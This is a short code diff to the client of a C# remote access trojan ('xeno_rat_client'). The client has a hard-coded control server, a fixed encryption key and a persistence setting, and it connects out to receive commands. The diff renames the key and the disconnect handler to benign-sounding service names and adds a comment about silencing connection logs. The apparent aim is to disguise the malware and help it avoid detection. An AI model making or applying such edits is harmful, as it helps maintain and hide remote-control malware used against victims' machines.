@@ -18,7 +18,7 @@ namespace xeno_rat_client
         private static ModuleManager ModuleManager = new ModuleManager();
         private static string ServerIp = "localhost";
         private static int ServerPort = 1234;
-        private static byte[] EncryptionKey = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
+        private static byte[] securityKey = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
         private static int delay = 1000;
         private static string serviceIdentifier = "123";
         private static int DoStartup = 2222;
@@ -120,7 +120,7 @@ namespace xeno_rat_client
                     using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                     {
                         await socket.ConnectAsync(ServerIp, ServerPort);
-                        Server = await Utils.ConnectAndSetupAsync(socket, EncryptionKey, 0, 0, OnDisconnect);
+                        Server = await Utils.ConnectAndSetupAsync(socket, securityKey, 0, 0, HandleServiceStop);
                         Handler handle = new Handler(Server, ModuleManager);
                         await handle.Type0Receive();
                     }
@@ -132,7 +132,7 @@ namespace xeno_rat_client
             }
         }
 
-        public static void OnDisconnect(Node MainNode)
+        public static void HandleServiceStop(Node MainNode)
         {
             // Silence connection logs
         }
